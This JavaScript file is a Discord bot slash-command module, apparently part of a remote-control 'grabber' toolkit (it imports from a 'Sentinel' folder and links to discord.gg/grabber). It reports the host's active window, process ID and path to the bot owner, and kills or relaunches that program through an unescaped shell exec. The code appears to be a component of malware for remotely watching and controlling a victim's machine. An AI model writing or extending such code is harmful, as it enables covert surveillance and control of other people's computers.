const { ApplicationCommandOptionType, EmbedBuilder } = require("discord.js"),
  activeWin = require("active-win"),
  kill = require("../../../Sentinel/utils/kill"),
  { config } = require("../../../config.js"),
  { exec } = require("child_process");

module.exports = {
  name: "currentpage",
  ownerOnly: true,
  description: "Instance of the current page",
  options: [
    {
      name: "close",
      description: "Close the current page",
      type: ApplicationCommandOptionType.Subcommand,
    },
    {
      name: "info",
      description: "Informations about the current page",
      type: ApplicationCommandOptionType.Subcommand,
    },
    {
      name: "restart",
      description: "Restart the current page",
      type: ApplicationCommandOptionType.Subcommand,
    },
    {
      name: "reopen",
      description: "Re-Open 1 more time the current page",
      type: ApplicationCommandOptionType.Subcommand,
    },
  ],
  run: async (client, interaction, args) => {
    const inter = interaction.options.getSubcommand();
    let window = await getActiveWindow();
    if (window === "None") return;
    switch (inter) {
      case "close":
        await interaction.reply({
          content: `Wait...`,
          ephemeral: true,
        });
        let nametokill = window.owner.name ?? "none";
        kill.KillProcessName(nametokill);
        await interaction.editReply({
          content: `Current Page Closed !`,
          ephemeral: true,
        });
        break;
      case "info":
        let CurrentPInfo = new EmbedBuilder()
          .setTitle("Current Page Information")
          .setURL("https://discord.gg/grabber")
          .addFields([
            {
              name: "ID",
              value: `\`${window.owner.processId}\``,
              inline: false,
            },
            { name: "Title", value: `\`${window.title}\``, inline: false },
            { name: "Name", value: `\`${window.owner.name}\``, inline: false },
            {
              name: "Memory Usage",
              value: `\`${(window.memoryUsage / (1024 * 1024 * 1024)).toFixed(
                2
              )}\``,
              inline: false,
            },
            {
              name: "Path",
              value: `\`\`\`${window.owner.path}\`\`\``,
              inline: false,
            },
          ],
          )
          .setColor(config.Color)
        await interaction.reply({
          content: ``,
          embeds: [CurrentPInfo],
          ephemeral: true,
        });
        break;
      case "restart":
        await interaction.reply({
          content: `Wait...`,
          ephemeral: true,
        });
        let nametok = window.owner.name ?? "none";
        await kill.KillProcessName(nametok);
        // Exécuter le fichier avec spawn
        const childProcess = exec(`start "" "${window.owner.path}"`);

        childProcess.unref();
        await interaction.editReply({
          content: `Current Page Restarted !`,
          ephemeral: true,
        });
        break;
      case "reopen":
        await interaction.reply({
          content: `Wait...`,
          ephemeral: true,
        });
        const cp = exec(`start "" "${window.owner.path}"`);

        cp.unref();
        await interaction.editReply({
          content: `Current Page Re Opened !`,
          ephemeral: true,
        });
        break;
      default:
        break;
    }
  },
};

async function getActiveWindow() {
  try {
    const window = await activeWin();
    if (window) {
      return window;
    } else {
      return "None";
    }
  } catch (error) {
    return "None";
  }
}
